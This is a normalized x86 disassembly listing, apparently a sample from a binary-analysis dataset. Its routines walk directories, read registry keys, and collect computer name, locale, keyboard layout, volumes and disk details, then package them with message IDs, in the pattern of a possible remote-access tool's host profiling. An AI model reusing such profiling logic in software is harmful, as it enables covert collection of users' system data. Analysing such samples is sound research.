mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1b5c
call sub_419050
push ebx
push esi
push edi
xor eax eax
push 0x144e
push eax
mov [ esp + 0x720 ] ax
lea eax [ esp + 0x722 ]
push eax
call sub_4130d0
add esp 0xc
push 0xffffffff
call sub_4046cc
push eax
mov eax 0x80156501
lea ecx [ esp + 0x2b8 ]
call sub_406b4c
and [ esp + 0x1b74 ] 0x0
lea esi [ esp + 0xc ]
call sub_405d11
mov [ esp + 0x1b74 ] 0x1
mov esi [ ebp + 0x8 ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0x5c ] esi
call sub_4110ef
lea eax [ esp + 0x2c ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0xc ]
mov [ esp + 0x24 ] esi
lea esi [ esp + 0x2b0 ]
mov [ esp + 0x20 ] eax
call sub_406c79
test al al
je r-xdata
mov [ esp + 0x1b74 ] 0x0
lea esi [ esp + 0xc ]
call sub_405f2c
or [ esp + 0x1b74 ] 0xffffffff
lea eax [ esp + 0x2b0 ]
call sub_406c46
mov ecx [ esp + 0x1b6c ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0xc ]
mov ebx esi
call sub_406f26
lea edi [ esp + 0x718 ]
call sub_40956d
test al al
je r-xdata
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x2b0 ]
call sub_406e3e
lea edi [ esp + 0x2b0 ]
call sub_406db6
mov eax edi
test eax eax
je r-xdata
xor eax eax
cmp eax sub_41165f
je r-xdata
mov eax edi
push eax
lea eax [ esp + 0x514 ]
push eax
call [ lstrcpyW@IAT ]
mov eax edi
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x60 ]
push eax
lea eax [ esp + 0x514 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x514 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x90 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x60 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x60 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x90 ]
push eax
call esi
test eax eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
lea eax [ esp + 0x64 ]
push eax
lea eax [ esp + 0x720 ]
push eax
push [ ebp + 0x8 ]
call sub_41165f
add esp 0x10
test al al
je r-xdata
sub_411ac3
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_41dc28
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebx
push esi
push edi
xor edi edi
xor eax eax
movsx cx [ eax + r--data ]
shl cx 0x2
mov [ esp + eax * 2 + 0x88 ] cx
inc eax
cmp eax 0x25
jl r-xdata
lea eax [ esp + 0x88 ]
push 0x4a
pop ecx
mov [ esp + 0x7c ] eax
mov [ esp + 0x78 ] ecx
xor eax eax
movsx dx [ eax + r--data ]
shl dx 0x2
mov [ esp + eax * 2 + 0xd8 ] dx
inc eax
cmp eax 0x25
jl r-xdata
lea eax [ esp + 0xd8 ]
mov [ esp + 0x84 ] eax
mov [ esp + 0x80 ] ecx
mov [ esp + 0x60 ] edi
cmp [ ebp + 0xc ] edi
jbe r-xdata
mov ecx [ esp + 0x12c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ esp + 0x60 ]
lea esi [ eax + ecx * 4 ]
mov eax [ esi ]
mov ecx [ eax + 0x1c ]
mov [ esp + 0x68 ] ecx
mov eax [ eax + 0x18 ]
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x1c ]
push eax
xor ebx ebx
inc ebx
push ebx
push edi
push edi
lea eax [ esp + 0x88 ]
push eax
push edi
lea eax [ esp + 0x7c ]
push eax
mov [ esp + 0x3c ] edi
mov [ esp + 0x38 ] edi
call [ rw-data ]
test eax eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
push ebx
push edi
push edi
lea eax [ esp + 0x90 ]
push eax
push edi
lea eax [ esp + 0x7c ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
call sub_4046cc
push ebx
push [ esp + 0x24 ]
mov ebx [ esp + 0x24 ]
call sub_403ebc
mov [ esp + 0x18 ] eax
cmp eax edi
je r-xdata
lea eax [ esp + 0x1c ]
push eax
push ebx
push edi
push edi
push edi
push edi
lea eax [ esp + 0x7c ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
call sub_4046cc
push ebx
push [ esp + 0x24 ]
mov ebx [ esp + 0x24 ]
call sub_403ebc
mov [ esp + 0x18 ] eax
cmp eax edi
je r-xdata
cmp [ esp + 0x20 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x30 ]
cmp ecx edi
jne r-xdata
call sub_4046cc
push ebx
push [ esp + 0x24 ]
mov ebx [ esp + 0x24 ]
call sub_403ebc
mov [ esp + 0x18 ] eax
cmp eax edi
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x2c ]
mov ebx [ eax + 0xc ]
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x28 ] eax
call sub_4046cc
lea esi [ esp + 0x4c ]
mov [ esp + 0x14 ] eax
call sub_405d11
mov [ esp + 0x134 ] 0x1
push edi
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop esi
mov eax esi
lea ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] 0x77010101
call sub_4060be
push r--data
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
push [ esp + 0x10 ]
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
push [ esp + 0x24 ]
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
push [ esp + 0x28 ]
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
push [ esp + 0x18 ]
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] edi
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x6c ] eax
push edi
lea eax [ esp + 0x70 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
mov [ esp + 0x14 ] 0x3
call sub_4060be
mov [ esp + 0xc ] edi
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x54 ]
call sub_4060be
push ebx
lea eax [ esp + 0x50 ]
push eax
call sub_4025f0
mov eax [ esp + 0x50 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
mov edi esi
lea eax [ esp + 0x50 ]
call sub_406173
push [ esp + 0x50 ]
mov esi [ esp + 0x18 ]
push 0x0
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x64 ]
push [ esp + 0x64 ]
call sub_40242d
or [ esp + 0x134 ] 0xffffffff
lea esi [ esp + 0x4c ]
jmp r-xdata
inc [ esp + 0x60 ]
mov eax [ esp + 0x60 ]
cmp eax [ ebp + 0xc ]
jb r-xdata
push [ esp + 0x20 ]
call [ LocalFree@IAT ]
mov [ esp + 0x5c ] ecx
mov [ esp + 0x14 ] eax
mov edx r--data
xor ebx ebx
mov ecx eax
mov [ esp + 0x14 ] edx
cmp [ eax ] di
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x2c ]
mov ebx [ eax + 0xc ]
mov [ esp + 0x24 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x28 ] eax
call sub_4046cc
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] eax
call sub_405d11
mov [ esp + 0x134 ] 0x2
push edi
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop esi
mov eax esi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] 0x77010101
call sub_4060be
push r--data
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
push [ esp + 0x10 ]
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
push [ esp + 0x24 ]
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
push [ esp + 0x28 ]
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
push [ esp + 0x18 ]
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] edi
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x70 ] eax
push edi
lea eax [ esp + 0x74 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
call sub_4060be
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] 0x3
call sub_4060be
mov [ esp + 0xc ] edi
push edi
lea eax [ esp + 0x10 ]
push eax
mov eax esi
lea ecx [ esp + 0x44 ]
call sub_4060be
push ebx
lea eax [ esp + 0x40 ]
push eax
call sub_4025f0
mov eax [ esp + 0x40 ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
mov edi esi
lea eax [ esp + 0x40 ]
call sub_406173
push [ esp + 0x40 ]
mov esi [ esp + 0x18 ]
push 0x0
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x54 ]
push [ esp + 0x54 ]
call sub_40242d
or [ esp + 0x134 ] 0xffffffff
lea esi [ esp + 0x3c ]
call sub_405f2c
call sub_4046cc
push [ esp + 0x18 ]
call sub_405c44
xor edi edi
push edi
lea eax [ esp + 0x2c ]
push eax
push 0x4
pop esi
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x30 ] 0x77010101
call sub_4060be
push r--data
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
push [ esp + 0x24 ]
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
push [ esp + 0x10 ]
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
push [ esp + 0x5c ]
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
push [ esp + 0x14 ]
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
push edi
lea eax [ esp + 0x14 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x14 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
call sub_4060be
push edi
lea eax [ esp + 0x14 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x74 ] eax
push edi
lea eax [ esp + 0x78 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
call sub_4060be
push edi
lea eax [ esp + 0x14 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] 0x3
call sub_4060be
push edi
lea eax [ esp + 0x14 ]
push eax
mov eax esi
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] edi
call sub_4060be
push ebx
lea eax [ esp + 0x30 ]
push eax
call sub_4025f0
mov eax [ esp + 0x30 ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
mov edi esi
lea eax [ esp + 0x30 ]
call sub_406173
push [ esp + 0x30 ]
mov esi [ esp + 0x10 ]
push 0x0
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x44 ]
push [ esp + 0x44 ]
call sub_40242d
or [ esp + 0x134 ] 0xffffffff
lea esi [ esp + 0x2c ]
call sub_405f2c
xor edi edi
cmp [ esp + 0x14 ] edi
jne r-xdata
mov [ esp + 0x5c ] eax
jmp r-xdata
inc ebx
cmp ebx 0x104
jge r-xdata
or [ esp + 0x134 ] 0xffffffff
call sub_405f2c
jmp r-xdata
mov esi [ esi ]
mov eax [ esi + 0x2c ]
mov ebx [ esi + 0xc ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0x24 ] eax
call sub_4046cc
lea esi [ esp + 0x2c ]
mov [ esp + 0xc ] eax
call sub_405d11
mov [ esp + 0x134 ] edi
cmp [ esp + 0x5c ] edi
jne r-xdata
mov [ esp + 0x5c ] edx
jmp r-xdata
cmp [ ecx ] 0x3a
je r-xdata
call sub_4046cc
push [ esp + 0x18 ]
call sub_405c44
jmp r-xdata
xor edx edx
mov [ ecx ] dx
add ecx 0x2
mov [ esp + 0x14 ] ecx
jmp r-xdata
add ecx 0x2
cmp [ ecx ] di
jne r-xdata
sub_41216f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4066e2
cmp eax 0x2
jl r-xdata
xor al al
push r--data
call sub_4046cc
mov ebx r--data
mov ecx eax
call sub_4010c5
push r--data
mov [ ebp - 0x8 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
xor ebx ebx
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
xor edi edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_4066e2
cmp eax 0x2
jle r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push edi
push ebx
call [ ebp - 0x8 ]
test eax eax
je r-xdata
inc edi
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_411ac3
pop ecx
pop ecx
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_412204
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x368
lea edi [ esi + 0x8 ]
push 0x0
push edi
mov [ ebp - 0x4 ] 0x100
call sub_4130d0
add esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
push edi
push r--data
push [ ebp + 0x8 ]
mov ebx 0x80000002
push ebx
lea edi [ ebp - 0x4 ]
call sub_4068cf
test al al
je r-xdata
cmp [ esi + 0x370 ] 0x0
je r-xdata
lea eax [ esi + 0x108 ]
push eax
push r--data
push [ ebp + 0x8 ]
lea edi [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] 0x40
call sub_4068cf
lea eax [ esi + 0x148 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x208
push ebx
call sub_4068cf
lea eax [ esi + 0x350 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x20
push ebx
call sub_4068cf
mov ecx [ esi + 0x4 ]
push 0x0
lea eax [ esi + 0x8 ]
push eax
mov eax 0x368
call sub_4060be
inc [ esi + 0x374 ]
jmp r-xdata
sub_4122cf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41da69
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1d94
call sub_419050
push ebx
push esi
push edi
lea esi [ esp + 0x28 ]
call sub_405d11
xor ebx ebx
mov [ esp + 0x1dac ] ebx
lea esi [ esp + 0x44 ]
call sub_405d11
mov [ esp + 0x1dac ] 0x1
push 0x618
lea eax [ esp + 0x178c ]
push ebx
push eax
call sub_4130d0
add esp 0xc
push 0x45c
lea eax [ esp + 0x584 ]
push ebx
push eax
call sub_4130d0
add esp 0xc
push 0x100
lea eax [ esp + 0x59c ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
call sub_40354f
mov [ esp + 0x588 ] eax
xor eax eax
mov [ esp + 0x1c ] 0x41
mov esi rw-data
cmp ax [ rw-data ]
jne r-xdata
mov edi [ lstrcpynW@IAT ]
push 0x40
push esi
lea eax [ esp + 0x8a8 ]
push eax
call edi
mov esi [ ebp + 0x8 ]
push esi
call sub_4057a1
mov eax rw-data
cmp [ rw-data ] bx
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
push esi
call [ GetComputerNameW@IAT ]
test eax eax
jne r-xdata
push 0x40
push eax
lea eax [ esp + 0x928 ]
push eax
call edi
call sub_40669b
mov eax [ esi + 0x5968 ]
mov [ esp + 0x58c ] eax
call sub_4066e2
push esi
mov [ esp + 0x588 ] eax
call sub_4057a1
mov [ esp + 0x580 ] eax
call [ GetACP@IAT ]
mov [ esp + 0x590 ] eax
call [ GetOEMCP@IAT ]
mov [ esp + 0x594 ] eax
lea eax [ esp + 0x698 ]
push eax
push 0x208
call [ GetCurrentDirectoryW@IAT ]
lea eax [ esp + 0x9c0 ]
push eax
call [ GetKeyboardLayoutNameW@IAT ]
lea eax [ esp + 0x9a0 ]
push eax
call [ GetLocalTime@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax r--data
push r--data
push esi
call [ lstrcpyW@IAT ]
mov eax [ esp + 0x74 ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x78 ]
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x3c ]
push eax
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x9b0 ]
push eax
lea eax [ esp + 0x40 ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax [ esi + 0x4f00 ]
add eax [ esi + 0x2bfc ]
push ebx
mov [ esp + 0x9dc ] eax
lea eax [ esp + 0x584 ]
push eax
mov eax 0x45c
lea ecx [ esp + 0x30 ]
call sub_4060be
mov [ esp + 0xc ] ebx
mov edi 0x118
cmp [ esi + 0x2bfc ] ebx
jbe r-xdata
push ebx
push 0x1c
lea ecx [ esp + 0x7c ]
push ecx
push 0x3
call eax
mov [ esp + 0xc ] ebx
cmp [ esi + 0x4f00 ] ebx
jbe r-xdata
lea eax [ esi + 0x900 ]
mov [ esp + 0x14 ] eax
lea esi [ esp + 0x54 ]
call sub_405d11
mov [ esp + 0x1dac ] 0x2
push 0x104
lea eax [ esp + 0x37c ]
push eax
mov [ esp + 0x14 ] ebx
call [ FindFirstVolumeW@IAT ]
mov [ esp + 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ esi + 0x2c04 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x24 ] eax
push ebx
lea eax [ esp + 0x28 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x30 ]
call sub_4060be
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add [ esp + 0x14 ] edi
cmp eax [ esi + 0x2bfc ]
jb r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x1c ]
push eax
push 0x4
pop edi
lea eax [ esp + 0x58 ]
call sub_406173
mov eax [ esp + 0x58 ]
push ebx
push [ esp + 0x58 ]
lea ecx [ esp + 0x30 ]
call sub_4060be
mov esi [ esp + 0x44 ]
push ebx
push [ esp + 0x4c ]
push esi
push 0x5
call [ rw-data ]
mov edi 0xc0000004
jmp r-xdata
mov edi 0x2e8
mov eax [ esp + 0x14 ]
mov eax [ eax ]
mov [ esp + 0x24 ] eax
push ebx
lea eax [ esp + 0x28 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x30 ]
call sub_4060be
inc [ esp + 0xc ]
mov eax [ esp + 0xc ]
add [ esp + 0x14 ] edi
cmp eax [ esi + 0x4f00 ]
jb r-xdata
cmp eax edi
je r-xdata
push eax
push [ esp + 0x68 ]
lea eax [ esp + 0x98 ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ esp + 0x90 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ esp + 0x2a0 ] eax
push ebx
lea eax [ esp + 0x374 ]
push eax
lea eax [ esp + 0x370 ]
push eax
lea eax [ esp + 0x9c ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ esp + 0x2ac ]
push eax
lea eax [ esp + 0x40 ]
push eax
push ebx
lea eax [ esp + 0x2b4 ]
push eax
push 0x80
lea eax [ esp + 0x300 ]
push eax
lea eax [ esp + 0x394 ]
push eax
call [ GetVolumeInformationW@IAT ]
push ebx
lea eax [ esp + 0x94 ]
push eax
mov eax edi
lea ecx [ esp + 0x5c ]
call sub_4060be
test [ esp + 0x38 ] 0x80
je r-xdata
push 0x8
pop eax
push 0x1
push 0x1e0
lea esi [ esp + 0x4c ]
call sub_405f9d
mov esi [ esp + 0x44 ]
push ebx
push [ esp + 0x4c ]
push esi
push 0x5
call [ rw-data ]
mov [ esp + 0x10 ] ebx
mov eax esi
cmp [ esi ] ebx
je r-xdata
mov [ esp + 0x1dac ] 0x2
lea esi [ esp + 0x64 ]
call sub_405f2c
push 0x104
lea eax [ esp + 0x37c ]
push eax
push [ esp + 0x24 ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
push 0x104
lea eax [ esp + 0xf6c ]
push eax
lea eax [ esp + 0x380 ]
push eax
call [ FindFirstVolumeMountPointW@IAT ]
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x30 ]
call sub_4060be
mov edi 0x210
push edi
lea eax [ esp + 0xd5c ]
push ebx
push eax
call sub_4130d0
add esp 0xc
jmp r-xdata
mov ecx [ esp + 0x10 ]
imul ecx ecx 0x1e0
cmp ecx [ esp + 0x48 ]
jae r-xdata
inc [ esp + 0xc ]
push edi
lea eax [ esp + 0x94 ]
push ebx
push eax
call sub_4130d0
add esp 0xc
lea eax [ esp + 0x378 ]
push eax
lea eax [ esp + 0x9c ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ esp + 0x20 ]
push eax
push ebx
push ebx
lea eax [ esp + 0x384 ]
push eax
mov [ esp + 0x30 ] ebx
call [ GetVolumePathNamesForVolumeNameW@IAT ]
mov eax [ esp + 0x20 ]
push 0x1
add eax eax
push eax
lea esi [ esp + 0x6c ]
call sub_405d65
mov [ esp + 0x1dac ] 0x3
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x24 ]
lea eax [ esp + 0x380 ]
push [ esp + 0x6c ]
push eax
call [ GetVolumePathNamesForVolumeNameW@IAT ]
mov eax [ esp + 0x68 ]
cmp eax 0x8
jbe r-xdata
push [ esp + 0x1c ]
call [ FindVolumeClose@IAT ]
push [ esp + 0x14 ]
call [ FindVolumeMountPointClose@IAT ]
mov esi [ lstrcpyW@IAT ]
inc [ esp + 0xc ]
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x137c ]
push eax
call esi
push edi
lea eax [ esp + 0x94 ]
push ebx
push eax
call sub_4130d0
add esp 0xc
cmp [ esp + 0x10 ] ebx
ja r-xdata
cmp [ eax + 0x3c ] ebx
je r-xdata
push ebx
lea eax [ esp + 0x94 ]
push eax
mov eax edi
lea ecx [ esp + 0x5c ]
call sub_4060be
push 0x104
lea eax [ esp + 0xf6c ]
push eax
push [ esp + 0x1c ]
call [ FindNextVolumeMountPointW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x1580 ]
push eax
lea eax [ esp + 0x9c ]
push eax
call esi
dec [ esp + 0x10 ]
mov eax [ esi + 0x3c ]
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x28 ]
mov [ esp + 0x9e4 ] eax
lea eax [ esp + 0x9e0 ]
push eax
mov esi sub_412204
push esi
push ebx
push 0x1
mov edi r--data
push edi
mov edx 0x80000002
mov [ esp + 0xd68 ] ebx
mov [ esp + 0xd64 ] 0x1
mov [ esp + 0x9f4 ] ecx
call sub_4069e9
push ebx
lea eax [ esp + 0xd58 ]
push eax
push 0x4
pop eax
lea ecx [ esp + 0x30 ]
call sub_4060be
cmp [ esp + 0xd54 ] ebx
je r-xdata
add eax [ eax ]
cmp [ eax ] ebx
jne r-xdata
inc [ esp + 0x10 ]
lea eax [ esp + 0x1378 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call esi
lea eax [ esp + 0xf68 ]
push eax
lea eax [ esp + 0x94 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x90 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ esp + 0x2a0 ] eax
push ebx
lea eax [ esp + 0x374 ]
push eax
lea eax [ esp + 0x370 ]
push eax
lea eax [ esp + 0x9c ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ esp + 0x2ac ]
push eax
lea eax [ esp + 0x40 ]
push eax
push ebx
lea eax [ esp + 0x2b4 ]
push eax
push 0x80
lea eax [ esp + 0x300 ]
push eax
lea eax [ esp + 0x394 ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ esp + 0x378 ]
push eax
lea eax [ esp + 0x1174 ]
push eax
call esi
lea eax [ esp + 0xf68 ]
push eax
lea eax [ esp + 0x1174 ]
push eax
call [ lstrcatW@IAT ]
push 0x104
lea eax [ esp + 0x1584 ]
push eax
lea eax [ esp + 0x1178 ]
push eax
call [ GetVolumeNameForVolumeMountPointW@IAT ]
test eax eax
je r-xdata
inc [ esp + 0x10 ]
push 0x208
push eax
lea eax [ esp + 0xd60 ]
push eax
call [ lstrcpynW@IAT ]
mov eax [ esi + 0x44 ]
mov [ esp + 0xf60 ] eax
mov eax [ esi + 0x48 ]
mov [ esp + 0xf64 ] eax
push ebx
lea eax [ esp + 0xd5c ]
push eax
mov eax edi
lea ecx [ esp + 0x30 ]
call sub_4060be
jmp r-xdata
mov edi [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
push edi
push ebx
push 0x46
push [ ebp + 0x8 ]
call sub_403aef
push eax
push 0x80f80001
push edi
push esi
mov esi [ ebp + 0x8 ]
call sub_40242d
mov [ esp + 0x1b ] al
mov [ esp + 0x1dac ] 0x1
lea esi [ esp + 0x54 ]
call sub_405f2c
mov [ esp + 0x1dac ] bl
lea esi [ esp + 0x44 ]
call sub_405f2c
or [ esp + 0x1dac ] 0xffffffff
lea esi [ esp + 0x28 ]
call sub_405f2c
mov ecx [ esp + 0x1da4 ]
mov al [ esp + 0x1b ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x9e0 ]
push eax
push esi
push ebx
push 0x1
push edi
mov edx 0x80000002
mov [ esp + 0xd64 ] bl
call sub_4069e9
add esi [ esi ]
sub_412a66
mov eax sub_41dc6f
call sub_4198ec
sub esp 0x18
push ebx
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi ecx
mov bl 0x1
call sub_405d11
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_405f2c
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov ecx esi
mov edx edi
call sub_40120a
push [ ebp - 0x1c ]
push 0x0
push 0x43
call sub_4046cc
push eax
call sub_403aef
push eax
push 0x80760002
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_4046cc
mov esi eax
call sub_40242d
mov bl al
test bl bl
je r-xdata
call sub_4015d2
sub_412aef
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dbfd
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb8
push ebx
push esi
push edi
lea eax [ esp + 0x50 ]
push eax
call sub_401108
xor ebx ebx
mov [ esp + 0xcc ] ebx
lea esi [ esp + 0x40 ]
call sub_405d11
mov [ esp + 0xcc ] 0x1
lea eax [ esp + 0x9c ]
push eax
call sub_401108
mov [ esp + 0xcc ] 0x2
push ebx
mov [ esp + 0x18 ] ebx
call [ CoInitialize@IAT ]
lea eax [ esp + 0x18 ]
push eax
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
cmp eax ebx
jne r-xdata
call [ CoUninitialize@IAT ]
mov [ esp + 0xcc ] 0x1
lea eax [ esp + 0x9c ]
push eax
call sub_40114f
mov [ esp + 0xcc ] bl
lea esi [ esp + 0x40 ]
call sub_405f2c
or [ esp + 0xcc ] 0xffffffff
lea eax [ esp + 0x50 ]
push eax
call sub_40114f
mov ecx [ esp + 0xc4 ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
